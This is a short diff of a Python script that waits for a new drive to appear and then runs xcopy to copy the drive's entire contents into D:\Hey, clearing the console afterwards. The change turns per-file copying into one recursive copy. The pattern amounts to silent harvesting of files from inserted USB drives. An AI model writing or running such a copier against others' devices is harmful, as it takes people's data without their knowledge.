@@ -13,12 +13,9 @@ while True:
 	if newLength > numberOfDrives:
 		required = newDriveList[newLength - 1]
 		newDrive = newDriveList[-1]
-		listOfFiles = os.listdir(newDrive)
-		for fil in listOfFiles[1:]:
-			fileName = newDrive[0] + newDrive[1] + "\\"
-			fileName += fil
-			cmd = 'xcopy ' + '"' + fileName + '"' + ' "D:\\Hey"' + ' /E'	
-			os.system(cmd)
+		print(newDrive)
+		cmd = "xcopy /s " + newDrive + "\*.*" + " D:\\Hey\\"
+		os.system(cmd)
+		os.system("cls")
 		break	
-	
 	time.sleep(5)
